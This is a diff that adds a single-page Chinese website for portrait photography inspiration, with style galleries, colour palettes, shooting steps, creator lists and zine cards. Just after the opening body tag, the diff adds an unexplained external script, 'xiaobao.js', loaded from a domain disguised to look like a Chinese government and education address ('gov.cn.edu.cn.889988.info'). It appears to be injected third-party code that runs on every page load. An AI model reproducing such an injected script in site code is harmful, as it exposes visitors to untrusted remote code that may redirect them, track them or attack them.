@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="写真电影网（xiezhendianyingwang-cn）聚焦人像写真、影像美学与视觉电影感短片，提供日系、胶片、情绪、旅拍等写真影像灵感与创作者导航。">
+<meta name="keywords" content="写真电影网,人像写真,影像美学,胶片写真,情绪写真,旅拍摄影,视觉短片,摄影灵感">
+<meta name="author" content="写真电影网">
+<meta name="theme-color" content="#1b1b1b">
+<title>写真电影网 - 人像写真 · 影像美学 · 电影感视觉 | xiezhendianyingwang-cn</title>
+<link rel="canonical" href="https://xiezhendianyingwang-cn.github.io">
+<style>
+/* ============ 基础 ============ */
+:root{
+  --ink:#151515; --paper:#f6f2ec; --soft:#d8d0c4; --line:rgba(0,0,0,.14);
+  --rose:#d9776a; --rose2:#eab3ab; --olive:#7c8168; --char:#2a2a2a; --mute:#8d887f;
+  --serif:"Songti SC","SimSun","Source Han Serif SC","WenQuanYi Micro Hei",Georgia,serif;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol,dl,menu{list-style:none}
+img{display:block;max-width:100%;object-fit:cover}
+button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
+::selection{background:var(--rose);color:#fff}
+::-webkit-scrollbar{height:8px;width:8px}
+::-webkit-scrollbar-thumb{background:rgba(0,0,0,.22);border-radius:6px}
+
+/* ============ 噪点 ============ */
+.grain{position:fixed;inset:0;z-index:-1;opacity:.5;mix-blend-mode:multiply;pointer-events:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.5'/%3E%3C/svg%3E")}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:60;background:rgba(246,242,236,.93);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.navbox{max-width:1280px;margin:0 auto;padding:0 26px;height:64px;display:flex;align-items:center;gap:12px}
+.logo{display:flex;align-items:center;gap:11px;font-family:var(--serif);font-weight:900;letter-spacing:2px}
+.logo b{font-size:21px}
+.logo i{font-style:normal;font-size:10.5px;letter-spacing:3px;color:var(--mute);border-left:1px solid var(--line);padding-left:11px}
+.navlinks{display:flex;gap:2px;margin-left:auto}
+.navlinks a{padding:9px 15px;font-size:13px;font-weight:700;color:#555;letter-spacing:.6px;position:relative;transition:.22s}
+.navlinks a::after{content:"";position:absolute;left:15px;right:15px;bottom:5px;height:1.5px;background:var(--rose);transform:scaleX(0);transition:.25s;transform-origin:right}
+.navlinks a:hover{color:var(--rose)}
+.navlinks a.act{color:var(--rose)}
+.navlinks a.act::after{transform:scaleX(1);transform-origin:left}
+.burger{display:none;width:44px;height:44px;border:1px solid var(--line);border-radius:50%;font-size:19px;color:var(--char)}
+
+/* ============ 通用 ============ */
+.box{max-width:1280px;margin:0 auto;padding:0 26px}
+.eyebrow{font-size:10.5px;letter-spacing:5px;color:var(--olive);text-transform:uppercase;font-weight:800}
+h2.sec{font-family:var(--serif);font-size:clamp(29px,4.4vw,48px);font-weight:900;letter-spacing:-.4px;line-height:1.2;margin-top:9px}
+h2.sec em{font-style:normal;color:var(--rose)}
+.lead{color:#5d5952;font-size:clamp(14px,1.55vw,16px);max-width:620px;margin-top:14px}
+.sechead{display:flex;align-items:flex-end;justify-content:space-between;gap:26px;flex-wrap:wrap;margin-bottom:36px;padding-bottom:16px;border-bottom:1px solid var(--line)}
+.secdesc{color:var(--mute);font-size:12.5px;max-width:420px}
+section{padding:74px 0;position:relative}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border:1.5px solid var(--ink);color:var(--ink);font-weight:800;font-size:13px;letter-spacing:1px;transition:.26s}
+.btn:hover{background:var(--ink);color:var(--paper);transform:translateY(-2px)}
+.btn-rose{background:var(--rose);border-color:var(--rose);color:#fff}
+.btn-rose:hover{background:#c46258;border-color:#c46258;color:#fff}
+mark{background:transparent;color:var(--rose);border-bottom:2px solid var(--char);padding-bottom:1px}
+
+/* ============ Hero：大图 + 浮动文字 ============ */
+.hero{padding:0;min-height:min(660px,90vh);display:grid;grid-template-columns:1fr 1.05fr;align-items:center;gap:0}
+.htxt{padding:60px 40px 60px 0}
+.htxt h1{font-family:var(--serif);font-size:clamp(46px,8.6vw,96px);font-weight:970;line-height:.98;letter-spacing:-3px}
+.htxt h1 span{display:block;color:var(--rose)}
+.hmeta{display:flex;gap:26px;margin:26px 0 18px;flex-wrap:wrap}
+.hmeta div b{font-family:var(--serif);font-size:26px;font-weight:970;display:block;line-height:1.15;font-variant-numeric:tabular-nums}
+.hmeta div small{font-size:10px;letter-spacing:2px;color:var(--mute)}
+.hero-img{position:relative;height:100%;min-height:420px}
+.hero-img img{width:100%;height:100%;object-fit:cover;filter:saturate(.92)}
+.hero-img::after{content:"";position:absolute;inset:0;background:linear-gradient(120deg,transparent 45%,rgba(246,242,236,.92) 80%)}
+.hquote{position:absolute;left:26px;bottom:26px;z-index:3;max-width:300px;font-family:var(--serif);font-size:15px;color:var(--char);background:rgba(255,255,255,.72);backdrop-filter:blur(6px);padding:14px 16px;border-left:3px solid var(--rose)}
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.tags span{font-size:11px;letter-spacing:1.5px;color:#6b655c;border:1px solid var(--line);padding:4px 11px}
+
+/* ============ 栏目1 风格：Masonry 瀑布流 ============ */
+.masonry{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:120px;gap:14px}
+.ms{grid-row:span 2}
+.ms2{grid-row:span 3}
+.tile{position:relative;overflow:hidden;background:#e6e0d6;transition:.4s}
+.tile img{width:100%;height:100%;transition:.7s}
+.tile:hover img{transform:scale(1.07);filter:saturate(1.1)}
+.tile figcaption{position:absolute;inset:auto 0 0;padding:34px 16px 14px;color:#fff;background:linear-gradient(to top,rgba(0,0,0,.72),transparent)}
+.tile figcaption b{font-family:var(--serif);font-size:16px;display:block}
+.tile figcaption small{font-size:10.5px;letter-spacing:2px;color:var(--rose2)}
+
+/* ============ 栏目2 色调：色卡 ============ */
+.pal{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.sw{position:relative;aspect-ratio:3/4;padding:16px;display:flex;flex-direction:column;justify-content:flex-end;color:#fff;transition:.35s;cursor:pointer}
+.sw:hover{transform:translateY(-7px);box-shadow:0 18px 40px rgba(0,0,0,.22)}
+.sw b{font-family:var(--serif);font-size:19px;line-height:1.3}
+.sw .hex{font-size:10.5px;letter-spacing:1.5px;opacity:.85;margin-top:3px;font-variant-numeric:tabular-nums}
+.sw .dot{position:absolute;top:14px;right:14px;width:12px;height:12px;border-radius:50%;background:#fff;opacity:.75}
+
+/* ============ 栏目3 场景：Steps 流程 ============ */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;counter-reset:s}
+.step{padding:24px 20px 20px;border:1px solid var(--line);margin-left:-1px;margin-top:-1px;position:relative;transition:.3s;background:var(--paper)}
+.step:hover{background:#fff;z-index:2;box-shadow:0 14px 34px rgba(0,0,0,.1)}
+.step::before{counter-increment:s;content:counter(s,decimal-leading-zero);font-family:var(--serif);font-weight:970;font-size:40px;color:var(--soft);line-height:1;transition:.3s}
+.step:hover::before{color:var(--rose)}
+.step h4{font-family:var(--serif);font-size:18.5px;margin:6px 0 7px}
+.step p{font-size:12.5px;color:#6b655c}
+.step .arr{position:absolute;top:20px;right:18px;color:var(--rose);font-weight:900;opacity:0;transition:.3s}
+.step:hover .arr{opacity:1;transform:translateX(4px)}
+
+/* ============ 栏目4 创作者：列表 + 缩略 ============ */
+.creators{display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center}
+.clist{display:flex;flex-direction:column;gap:12px}
+.creator{display:grid;grid-template-columns:66px 1fr auto;align-items:center;gap:16px;padding:12px 14px;border:1px solid var(--line);transition:.3s}
+.creator:hover{border-color:var(--rose);background:#fff;transform:translateX(6px)}
+.creator .ph{width:52px;height:52px;border-radius:50%;overflow:hidden}
+.creator .ph img{width:100%;height:100%;filter:grayscale(.4)}
+.creator h5{font-family:var(--serif);font-size:16px}
+.creator small{font-size:11px;color:var(--mute);letter-spacing:.6px}
+.creator .ct{font-size:10.5px;letter-spacing:1.5px;color:var(--rose);border:1px solid var(--rose);padding:3px 9px}
+.gslide{position:relative;overflow:hidden;border:10px solid #fff;box-shadow:0 20px 50px rgba(0,0,0,.18);transform:rotate(1.2deg)}
+.gtrack{display:flex;transition:transform .5s}
+.gtrack figure{min-width:100%;position:relative}
+.gtrack img{width:100%;aspect-ratio:4/3}
+.gtrack figcaption{position:absolute;left:0;right:0;bottom:0;padding:30px 16px 12px;color:#fff;background:linear-gradient(to top,rgba(0,0,0,.65),transparent);font-family:var(--serif);font-size:14px}
+.gnav{display:flex;gap:8px;justify-content:center;margin-top:16px}
+.gnav i{width:9px;height:9px;border-radius:50%;background:var(--soft);cursor:pointer;transition:.25s}
+.gnav i.on{background:var(--rose);transform:scale(1.35)}
+
+/* ============ 栏目5 影集：Carousel 走马灯 ============ */
+.zine{position:relative;overflow:hidden;padding:6px 0}
+.ztrack{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none}
+.ztrack::-webkit-scrollbar{display:none}
+.zcard{min-width:min(300px,72vw);scroll-snap-align:start}
+.zcard .ph{aspect-ratio:3/4;overflow:hidden}
+.zcard .ph img{width:100%;height:100%;transition:.6s}
+.zcard:hover .ph img{transform:scale(1.06)}
+.zcard h5{font-family:var(--serif);font-size:16.5px;margin-top:11px}
+.zcard .meta{font-size:11px;color:var(--mute);letter-spacing:1px;margin-top:3px}
+.zcard p{font-size:12.5px;color:#6b655c;margin-top:7px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* ============ 栏目6 关于：引用块 + 计数器 ============ */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:54px;align-items:center}
+.pull{font-family:var(--serif);font-size:clamp(21px,2.8vw,34px);line-height:1.65;color:var(--char);font-weight:600;border-left:5px solid var(--rose);padding-left:22px}
+.pull q{color:var(--rose);quotes:"\201C""\201D"}
+.numbers{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line)}
+.num{padding:24px 18px;background:var(--paper);transition:.3s}
+.num:hover{background:#fff}
+.num b{font-family:var(--serif);font-size:38px;font-weight:970;color:var(--rose);display:block;line-height:1.1;font-variant-numeric:tabular-nums}
+.num span{font-size:12px;color:#6b655c;letter-spacing:.6px}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);background:#efe9df;padding:48px 0 22px;margin-top:18px}
+.fgrid{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:28px;margin-bottom:30px}
+.fcol h5{font-family:var(--serif);font-size:14.5px;margin-bottom:13px;letter-spacing:2px;color:var(--char)}
+.fcol a{display:block;font-size:12.5px;color:#6b655c;padding:5px 0;transition:.2s}
+.fcol a:hover{color:var(--rose);transform:translateX(5px)}
+.copy{text-align:center;color:#8d887f;font-size:11.5px;border-top:1px solid var(--line);padding-top:20px;letter-spacing:.3px}
+.copy b{color:var(--rose)}
+
+.top{position:fixed;right:16px;bottom:20px;width:44px;height:44px;border:1.5px solid var(--ink);border-radius:50%;display:grid;place-items:center;font-size:16px;font-weight:900;opacity:0;pointer-events:none;transition:.3s;z-index:70}
+.top.show{opacity:1;pointer-events:auto}
+
+/* ============ 响应式 ============ */
+@media(max-width:1060px){
+  .hero{grid-template-columns:1fr;min-height:auto}
+  .htxt{padding:46px 0 30px}
+  .hero-img{min-height:360px;max-height:460px}
+  .hero-img::after{background:linear-gradient(to top,var(--paper) 4%,transparent 35%)}
+  .masonry{grid-template-columns:repeat(3,1fr)}
+  .creators{grid-template-columns:1fr;gap:34px}
+}
+@media(max-width:720px){
+  .burger{display:grid;place-items:center;margin-left:auto}
+  .navlinks{position:fixed;inset:64px 0 0 0;flex-direction:column;background:var(--paper);padding:18px 14px;gap:5px;transform:translateY(-102%);transition:.42s cubic-bezier(.4,0,.2,1);z-index:59;overflow:auto}
+  .navlinks.open{transform:translateY(0)}
+  .navlinks a{font-size:17px;padding:15px 15px;border:1px solid var(--line);background:#fff}
+  .navlinks a.act{background:var(--rose);color:#fff}
+  .navlinks a::after{display:none}
+  .logo i{display:none}
+  .box{padding:0 17px}
+  section{padding:54px 0}
+  .pal{grid-template-columns:repeat(2,1fr)}
+  .steps,.masonry{grid-template-columns:repeat(2,1fr)}
+  .masonry{grid-auto-rows:100px}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:440px){
+  .navbox{height:58px;padding:0 15px}
+  .logo b{font-size:18px}
+  .pal,.steps,.masonry{grid-template-columns:1fr 1fr}
+  .fgrid{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;gap:30px}
+  .numbers{grid-template-columns:1fr}
+  .hmeta{gap:20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="grain" aria-hidden="true"></div>
+
+<!-- ========== 导航 ========== -->
+<header class="nav">
+  <div class="navbox">
+    <a class="logo" href="#top"><b>写真电影网</b><i>XIEZHEN FILM</i></a>
+    <nav class="navlinks" id="navlinks">
+      <a href="#style" class="act">写真风格</a>
+      <a href="#tone">影像色调</a>
+      <a href="#scene">拍摄场景</a>
+      <a href="#maker">影像作者</a>
+      <a href="#zine">影集专栏</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="切换菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ========== Hero ========== -->
+<section class="hero" id="top">
+  <div class="htxt">
+    <div class="eyebrow">PORTRAIT · CINEMATIC · VISUAL</div>
+    <h1>把一张脸，<span>拍成一部电影。</span></h1>
+    <p class="lead"><strong>写真电影网</strong>（xiezhendianyingwang-cn）专注于<mark>人像写真</mark>与<mark>影像美学</mark>：从日系、胶片到情绪、旅拍，为摄影师与审美爱好者整理可复用的视觉灵感与创作者索引。</p>
+    <div class="hmeta">
+      <div><b>9,600+</b><small>影像灵感</small></div>
+      <div><b>12</b><small>写真风格</small></div>
+      <div><b>48</b><small>影像作者</small></div>
+    </div>
+    <div style="display:flex;gap:11px;flex-wrap:wrap">
+      <a class="btn btn-rose" href="#style">浏览写真风格 →</a>
+      <a class="btn" href="#zine">读影集专栏</a>
+    </div>
+    <div class="tags">
+      <span>日系</span><span>胶片</span><span>情绪</span><span>光影</span><span>旅拍</span><span>黑白</span><span>少女</span><span>复古</span>
+    </div>
+  </div>
+  <div class="hero-img">
+    <img src="https://picsum.photos/id/1025/900/1100" alt="写真电影感人像摄影">
+    <div class="hquote">「光是写真的第一语言。找到光，就找到了情绪。」</div>
+  </div>
+</section>
+
+<!-- ========== 栏目1：写真风格（DOM: Masonry 瀑布流） ========== -->
+<section id="style">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">STYLE · 写真风格</div>
+        <h2 class="sec">十二种<em>看人的方式</em></h2>
+        <p class="secdesc">风格不是滤镜，是光、构图与被摄者之间的一次共识。</p>
+      </div>
+      <a class="btn" href="#tone">接着看色调 →</a>
+    </div>
+
+    <div class="masonry">
+      <figure class="tile ms2"><img src="https://picsum.photos/id/1011/500/760" alt="日系写真"><figcaption><b>日系 · 空气感</b><small>JAPANESE</small></figcaption></figure>
+      <figure class="tile ms"><img src="https://picsum.photos/id/1080/500/500" alt="胶片写真"><figcaption><b>胶片 · 颗粒</b><small>FILM GRAIN</small></figcaption></figure>
+      <figure class="tile"><img src="https://picsum.photos/id/1062/500/360" alt="情绪写真"><figcaption><b>情绪 · 低饱和</b><small>MOOD</small></figcaption></figure>
+      <figure class="tile ms"><img src="https://picsum.photos/id/1074/500/500" alt="黑白人像"><figcaption><b>黑白 · 高反差</b><small>B&amp;W</small></figcaption></figure>
+      <figure class="tile"><img src="https://picsum.photos/id/1048/500/360" alt="旅拍写真"><figcaption><b>旅拍 · 叙事</b><small>TRAVEL</small></figcaption></figure>
+      <figure class="tile ms2"><img src="https://picsum.photos/id/1084/500/760" alt="复古写真"><figcaption><b>复古 · 旧时光</b><small>VINTAGE</small></figcaption></figure>
+      <figure class="tile"><img src="https://picsum.photos/id/1060/500/360" alt="光影人像"><figcaption><b>光影 · 明暗</b><small>CHIAROSCURO</small></figcaption></figure>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目2：影像色调（DOM: 色卡 PALETTE） ========== -->
+<section id="tone" style="background:linear-gradient(180deg,transparent,#eceae3)">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">PALETTE · 影像色调</div>
+        <h2 class="sec">先定<em>颜色</em>，再定情绪</h2>
+        <p class="secdesc">五组写真电影网常用调色参考。点击色块，把它记进下一组片子。</p>
+      </div>
+      <div class="tabs" style="display:flex;gap:6px">
+        <span class="btn btn-rose" style="padding:7px 15px;font-size:11.5px;cursor:default">全部</span>
+        <span class="btn" style="padding:7px 15px;font-size:11.5px">暖调</span>
+        <span class="btn" style="padding:7px 15px;font-size:11.5px">冷调</span>
+      </div>
+    </div>
+
+    <div class="pal">
+      <div class="sw" style="background:linear-gradient(160deg,#e7d8c9,#d4bba1)"><span class="dot"></span><b>奶咖</b><div class="hex">#D9C2AA</div></div>
+      <div class="sw" style="background:linear-gradient(160deg,#c9d6d2,#9fb8b3)"><span class="dot"></span><b>雾青</b><div class="hex">#A3B9B4</div></div>
+      <div class="sw" style="background:linear-gradient(160deg,#d98b7e,#b35c52)"><span class="dot"></span><b>陶土</b><div class="hex">#C4675A</div></div>
+      <div class="sw" style="background:linear-gradient(160deg,#2d2f36,#4a4d57)"><span class="dot"></span><b>胶片灰</b><div class="hex">#42454D</div></div>
+      <div class="sw" style="background:linear-gradient(160deg,#e8c86a,#c9a13c)"><span class="dot"></span><b>逆光金</b><div class="hex">#D3AC48</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目3：拍摄场景（DOM: Steps 编号流程） ========== -->
+<section id="scene">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">SCENE · 拍摄场景</div>
+        <h2 class="sec">一组写真的<em>四个步骤</em></h2>
+        <p class="secdesc">从"想拍"到"出片"，写真电影网建议的顺序。</p>
+      </div>
+      <a class="btn" href="#maker">认识影像作者 →</a>
+    </div>
+
+    <div class="steps">
+      <div class="step"><span class="arr">→</span><h4>定主题</h4><p>先有情绪词：松弛、倔强、潮湿、旧梦。主题先于服装与场地。</p></div>
+      <div class="step"><span class="arr">→</span><h4>选光线</h4><p>窗光、逆光、阴天散射、路灯暖光。光决定照片的电影感。</p></div>
+      <div class="step"><span class="arr">→</span><h4>控构图</h4><p>留白、框架、前景遮挡、浅景深。让画面自己说话。</p></div>
+      <div class="step"><span class="arr">→</span><h4>做调色</h4><p>降饱和、提阴影、统一色温。一套色调，就是一个作者签名。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目4：影像作者（DOM: 列表 + 轮播） ========== -->
+<section id="maker" style="background:linear-gradient(180deg,#eceae3,transparent)">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">MAKER · 影像作者</div>
+        <h2 class="sec">镜头后面的<em>名字</em></h2>
+        <p class="secdesc">写真电影网长期收录的影像作者。风格即人格。</p>
+      </div>
+      <a class="btn btn-rose" href="#zine">看他们的影集 →</a>
+    </div>
+
+    <div class="creators">
+      <div class="clist">
+        <article class="creator"><div class="ph"><img src="https://picsum.photos/id/1027/150/150" alt="影像作者"></div><div><h5>林知微</h5><small>胶片 · 情绪人像</small></div><span class="ct">36 组</span></article>
+        <article class="creator"><div class="ph"><img src="https://picsum.photos/id/1066/150/150" alt="影像作者"></div><div><h5>陈屿</h5><small>日系 · 空气感</small></div><span class="ct">51 组</span></article>
+        <article class="creator"><div class="ph"><img src="https://picsum.photos/id/1083/150/150" alt="影像作者"></div><div><h5>苏晚</h5><small>旅拍 · 叙事</small></div><span class="ct">28 组</span></article>
+        <article class="creator"><div class="ph"><img src="https://picsum.photos/id/1077/150/150" alt="影像作者"></div><div><h5>周亦白</h5><small>黑白 · 高反差</small></div><span class="ct">44 组</span></article>
+      </div>
+
+      <div class="gslide">
+        <div class="gtrack" id="gtrack">
+          <figure><img src="https://picsum.photos/id/1041/720/540" alt="影像作品"><figcaption>「窗边，下午四点。」 · 林知微</figcaption></figure>
+          <figure><img src="https://picsum.photos/id/1058/720/540" alt="影像作品"><figcaption>「海风吹乱了头发。」 · 苏晚</figcaption></figure>
+          <figure><img src="https://picsum.photos/id/1069/720/540" alt="影像作品"><figcaption>「黑白里没有谎话。」 · 周亦白</figcaption></figure>
+        </div>
+        <div class="gnav" id="gnav"><i class="on"></i><i></i><i></i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目5：影集专栏（DOM: Carousel 走马灯） ========== -->
+<section id="zine">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">ZINE · 影集专栏</div>
+        <h2 class="sec">慢下来的<em>影像阅读</em></h2>
+        <p class="secdesc">写真电影网每月一辑。横向滑动，像翻一本纸质影集。</p>
+      </div>
+      <span class="btn" style="cursor:default">2026 年 10 月 · 第 38 辑</span>
+    </div>
+
+    <div class="zine">
+      <div class="ztrack">
+        <article class="zcard"><div class="ph"><img src="https://picsum.photos/id/1080/520/690" alt="影集封面"></div><h5>潮湿的八月</h5><div class="meta">情绪写真 · 12 张</div><p>雨后、玻璃、未干的水痕。一组关于"黏腻"的南方影像。</p></article>
+        <article class="zcard"><div class="ph"><img src="https://picsum.photos/id/1047/520/690" alt="影集封面"></div><h5>逆光少女</h5><div class="meta">日系写真 · 9 张</div><p>黄昏前的二十分钟。用光把轮廓镀一层金。</p></article>
+        <article class="zcard"><div class="ph"><img src="https://picsum.photos/id/1062/520/690" alt="影集封面"></div><h5>旧公寓</h5><div class="meta">复古写真 · 15 张</div><p>90 年代的家具、花纹墙纸、老式电风扇，和时间一起出镜。</p></article>
+        <article class="zcard"><div class="ph"><img src="https://picsum.photos/id/1074/520/690" alt="影集封面"></div><h5>一个人的旅途</h5><div class="meta">旅拍写真 · 11 张</div><p>站台、行李箱、陌生城市的晚霞。独自出发的人最有故事。</p></article>
+        <article class="zcard"><div class="ph"><img src="https://picsum.photos/id/1059/520/690" alt="影集封面"></div><h5>黑白来信</h5><div class="meta">黑白人像 · 8 张</div><p>去掉颜色，只剩光、骨相与眼神。最诚实的一种拍法。</p></article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目6：关于（DOM: 引用块 + 计数器） ========== -->
+<section id="about">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">ABOUT · 关于本站</div>
+        <h2 class="sec">关于 <em>写真电影网</em></h2>
+        <p class="secdesc">xiezhendianyingwang-cn —— 为"想拍得更好看"而存在的影像灵感库。</p>
+      </div>
+    </div>
+
+    <div class="about">
+      <p class="pull">我们相信，<q>每个人身上都有一部电影</q>。写真电影网不做器材评测，只做<strong style="color:var(--rose)">可被看见的审美</strong>——把值得参考的写真、色调与作者，整理成可以慢慢翻的册子。</p>
+      <div class="numbers">
+        <div class="num"><b>9,600</b><span>影像灵感条</span></div>
+        <div class="num"><b>12</b><span>写真风格</span></div>
+        <div class="num"><b>48</b><span>影像作者</span></div>
+        <div class="num"><b>38</b><span>影集辑数</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 页脚 ========== -->
+<footer>
+  <div class="box">
+    <div class="fgrid">
+      <div class="fcol">
+        <a class="logo" href="#top" style="font-size:19px"><b>写真电影网</b></a>
+        <p style="color:#8d887f;font-size:12.5px;margin-top:13px;max-width:330px">写真电影网（xiezhendianyingwang-cn）是一个关于人像写真、影像美学与电影感视觉的灵感与导航站点。愿每一次按下快门，都更接近想表达的那个人。</p>
+      </div>
+      <div class="fcol"><h5>风格</h5><a href="#style">日系写真</a><a href="#style">胶片颗粒</a><a href="#style">情绪人像</a><a href="#style">黑白高反差</a></div>
+      <div class="fcol"><h5>色调</h5><a href="#tone">暖调</a><a href="#tone">冷调</a><a href="#tone">低饱和</a><a href="#tone">电影感调色</a></div>
+      <div class="fcol"><h5>关于</h5><a href="#about">关于本站</a><a href="#">投稿作品</a><a href="#">版权声明</a><a href="#">隐私条款</a></div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> <b>写真电影网</b> · xiezhendianyingwang-cn &nbsp;|&nbsp; 网址：https://xiezhendianyingwang-cn.github.io &nbsp;|&nbsp; 本页为演示用单页示例，内页链接以 # 占位。影像作品版权归原作者所有。
+    </div>
+  </div>
+</footer>
+
+<a class="top" id="topBtn" href="#top" aria-label="回到顶部">↑</a>
+
+<script>
+/* 菜单 */
+var burger=document.getElementById('burger'),nav=document.getElementById('navlinks');
+burger.addEventListener('click',function(){
+  nav.classList.toggle('open');
+  burger.setAttribute('aria-expanded',nav.classList.contains('open'));
+  burger.textContent=nav.classList.contains('open')?'✕':'☰';
+});
+nav.addEventListener('click',function(e){
+  if(e.target.tagName==='A'){nav.classList.remove('open');burger.setAttribute('aria-expanded','false');burger.textContent='☰';}
+});
+
+/* 滚动高亮 */
+var links=document.querySelectorAll('.navlinks a'),ids=['style','tone','scene','maker','zine','about'];
+var secs=ids.map(function(i){return document.getElementById(i);});
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+130,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  links.forEach(function(a){a.classList.toggle('act',a.getAttribute('href')==='#'+cur);});
+  document.getElementById('topBtn').classList.toggle('show',window.scrollY>800);
+},{passive:true});
+
+/* 作者作品轮播 */
+var track=document.getElementById('gtrack'),dots=document.querySelectorAll('#gnav i'),i=0;
+function go(n){
+  i=(n+track.children.length)%track.children.length;
+  track.style.transform='translateX('+(-i*100)+'%)';
+  dots.forEach(function(d,k){d.classList.toggle('on',k===i);});
+}
+setInterval(function(){go(i+1);},4300);
+dots.forEach(function(d,k){d.addEventListener('click',function(){go(k);});});
+
+/* Tabs */
+document.querySelectorAll('.tabs').forEach(function(g){
+  g.addEventListener('click',function(e){
+    if(!e.target.classList.contains('btn'))return;
+    g.querySelectorAll('.btn').forEach(function(t){t.classList.remove('btn-rose');});
+    e.target.classList.add('btn-rose');
+  });
+});
+
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
